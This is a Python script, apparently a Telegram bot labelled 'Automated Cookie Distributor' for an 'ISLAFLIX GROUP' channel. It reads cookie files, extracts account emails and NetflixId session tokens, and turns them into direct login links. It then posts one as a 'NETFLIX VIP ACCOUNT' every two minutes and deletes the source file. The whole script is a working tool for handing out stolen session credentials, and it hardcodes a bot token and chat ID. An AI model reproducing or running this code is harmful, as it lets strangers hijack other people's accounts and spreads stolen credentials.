import os
import time
import re
import html
import requests

# ================= CONFIGURATION =================
TOKEN = "8761634086:AAGEenb8YLL0IP-ReDTG8upj8VN_ZIT9hEs"
CHAT_ID = "-1004447097011"
COOKIES_DIR = "./cookies"
INTERVAL_SECONDS = 2 * 60  # 2 minutes interval between each send
# =================================================

def parse_cookies_file(file_path):
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    # Extract Full Email
    email_match = re.search(r'Email:\s*([^\s@]+(?:@[^\s@]+)?)', content, re.IGNORECASE)
    if not email_match:
        email_match = re.search(r'[–-]\s*Email:\s*([^\s]+)', content, re.IGNORECASE)
    email_full = email_match.group(1).strip() if email_match else "unknown@gmail.com"

    # Extract Profiles & Clean HTML entities
    profiles_match = re.search(r'Profiles:\s*(.+)', content, re.IGNORECASE)
    if profiles_match:
        profiles = profiles_match.group(1).strip()
    else:
        prof_match = re.search(r'Profile:\s*(.+)', content, re.IGNORECASE)
        profiles = prof_match.group(1).strip() if prof_match else "User"
    profiles = html.unescape(profiles)

    # Extract Country
    country_match = re.search(r'Country:\s*([A-Z]{2})', content, re.IGNORECASE)
    country = country_match.group(1).upper() if country_match else "US"

    flags = {
        "ID": "🇮🇩 Indonesia",
        "US": "🇺🇸 United States",
        "TR": "🇹🇷 Turkey",
        "AR": "🇦🇷 Argentina",
        "IN": "🇮🇳 India",
        "BR": "🇧🇷 Brazil",
        "EG": "🇪🇬 Egypt",
        "FR": "🇫🇷 France",
        "DE": "🇩🇪 Germany",
        "CA": "🇨🇦 Canada"
    }
    country_display = flags.get(country, country)

    # Extract Plan / Type if available in file
    plan_match = re.search(r'Plan:\s*(.+)', content, re.IGNORECASE)
    plan_type = plan_match.group(1).strip() if plan_match else "Ultra HD / Premium"

    # Extract Token / NetflixId
    netflix_id_match = re.search(r'NetflixId\tTRUE\t/\tTRUE\t\d+\tNetflixId\t([^\s]+)', content)
    if not netflix_id_match:
        netflix_id_match = re.search(r'NetflixId\s+([^\s]+)', content)
    
    if netflix_id_match:
        token_val = netflix_id_match.group(1)
    else:
        token_match = re.search(r'Token:\s*([^\n]+)', content)
        if token_match:
            token_val = token_match.group(1).strip()
        else:
            token_val = ""

    token_clean = token_val.replace(" ", "+")

    pc_link = f"https://netflix.com/?nftoken={token_clean}"
    android_link = f"https://netflix.com/unsupported?nftoken={token_clean}"
    ios_link = f"https://netflix.com/?nftoken={token_clean}"
    tv_link = f"https://netflix.com/tv2?nftoken={token_clean}"

    # Template with "Available Accounts" and "React for more"
    msg = f"""✂️ ════════════════════════════════════ ✂️
🎬 **NETFLIX VIP ACCOUNT** 🌟
🔥 **حسابات متوفرة | Available Accounts**

✅ **Status:** Ready For Instant Use
📧 **Email:** `{email_full}`
👥 **Profiles:** {profiles}
🌍 **Country:** {country_display}
💎 **Plan:** {plan_type}

🔗 **Direct Login Links:**
[💻 PC]({pc_link}) | [🤖 Android]({android_link})
[🍏 iOS]({ios_link}) | [📺 TV]({tv_link})

💬 **تفاعل للمزيد | React for more**
⚡ *ISLAFLIX GROUP*
✂️ ════════════════════════════════════ ✂️"""

    return msg

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            data = response.json()
            message_id = data.get("result", {}).get("message_id")
            print("[+] Account sent successfully!")
            if message_id:
                add_reaction(message_id)
            return True
        else:
            print(f"[-] Telegram API Error: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Connection Error: {e}")
        return False

def add_reaction(message_id):
    url = f"https://api.telegram.org/bot{TOKEN}/setMessageReaction"
    payload = {
        "chat_id": CHAT_ID,
        "message_id": message_id,
        "reaction": [{"type": "emoji", "emoji": "🔥"}]
    }
    try:
        requests.post(url, json=payload)
    except:
        pass

def main():
    print("[*] Automated Cookie Distributor started.")
    if not os.path.exists(COOKIES_DIR):
        os.makedirs(COOKIES_DIR)

    while True:
        files = os.listdir(COOKIES_DIR)
        txt_files = [f for f in files if f.endswith('.txt')]

        if not txt_files:
            print("[i] No cookie files left in the folder. Waiting 2 minutes to check again...")
            time.sleep(INTERVAL_SECONDS)
            continue

        file_name = txt_files[0]
        file_path = os.path.join(COOKIES_DIR, file_name)
        print(f"\n[*] Processing file: {file_name}")

        try:
            formatted_message = parse_cookies_file(file_path)
            success = send_to_telegram(formatted_message)
            
            if success:
                os.remove(file_path)
                print(f"[+] File successfully sent and deleted: {file_name}")
            else:
                print("[-] Failed to send message, will retry this file in the next cycle.")
        except Exception as e:
            print(f"[-] Error processing file {file_name}: {e}")

        print(f"[*] Waiting 2 minutes before sending the next cookie...")
        time.sleep(INTERVAL_SECONDS)

if __name__ == "__main__":
    main()